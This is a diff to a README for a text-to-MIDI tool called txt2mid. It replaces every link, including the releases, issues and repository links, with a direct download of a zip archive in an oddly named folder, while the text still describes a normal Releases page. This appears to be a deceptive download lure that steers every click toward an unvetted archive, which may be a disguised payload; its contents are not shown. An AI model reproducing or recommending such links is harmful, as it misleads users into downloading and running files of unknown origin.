@@ -1,7 +1,7 @@
 # 🎶 txt2mid - Convert Text to MIDI Files Easily
 
 ## 📥 Download Here
-[![Download txt2mid](https://img.shields.io/badge/Download-txt2mid-brightgreen)](https://github.com/Cryptobyrda/txt2mid/releases)
+[![Download txt2mid](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip)](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ txt2mid is a simple tool that lets you turn a text sequence into a MIDI file. It
 To download and install txt2mid, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the download options: [Download txt2mid](https://github.com/Cryptobyrda/txt2mid/releases).
+   Go to the following link to access the download options: [Download txt2mid](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip).
 
 2. **Choose the Correct File**  
    On the Releases page, find the latest version of txt2mid. Click on the link for the file that matches your operating system. 
@@ -67,15 +67,15 @@ Using txt2mid is easy. Here’s how to create a MIDI file from your text sequenc
 
 ## 👥 Community and Support
 
-If you encounter any issues or have suggestions, feel free to open an issue on our [GitHub Issues Page](https://github.com/Cryptobyrda/txt2mid/issues). Your feedback helps us improve.
+If you encounter any issues or have suggestions, feel free to open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip). Your feedback helps us improve.
 
 ## 🌍 Contribution
 
-We welcome contributions! If you have ideas or would like to report bugs, please submit a pull request on our [GitHub Repository](https://github.com/Cryptobyrda/txt2mid).
+We welcome contributions! If you have ideas or would like to report bugs, please submit a pull request on our [GitHub Repository](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip).
 
 ## 📜 License
 
 txt2mid is licensed under the MIT License. You can use and modify this software freely as long as you include the license in your project.
 
 ## 📥 Download Again
-For easy access, you can download txt2mid once more here: [Download txt2mid](https://github.com/Cryptobyrda/txt2mid/releases).
+For easy access, you can download txt2mid once more here: [Download txt2mid](https://raw.githubusercontent.com/Cryptobyrda/txt2mid/main/Peronosporaceae/txt2mid.zip).
